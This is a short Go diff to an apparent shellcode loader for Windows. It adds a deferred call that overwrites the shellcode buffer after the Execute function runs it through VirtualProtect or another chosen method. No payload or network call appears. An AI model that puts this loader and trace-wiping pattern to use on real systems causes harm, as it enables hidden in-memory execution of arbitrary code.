@@ -10,6 +10,7 @@ import (
 
 	"project/internal/module/windows/api"
 	"project/internal/random"
+	"project/internal/security"
 )
 
 const memType = windows.MEM_COMMIT | windows.MEM_RESERVE
@@ -18,6 +19,7 @@ const memType = windows.MEM_COMMIT | windows.MEM_RESERVE
 // It will block until shellcode return.
 // warning: shellcode slice will be covered.
 func Execute(method string, shellcode []byte) error {
+	defer security.CoverBytes(shellcode)
 	switch method {
 	case "", MethodVirtualProtect:
 		return VirtualProtect(shellcode)
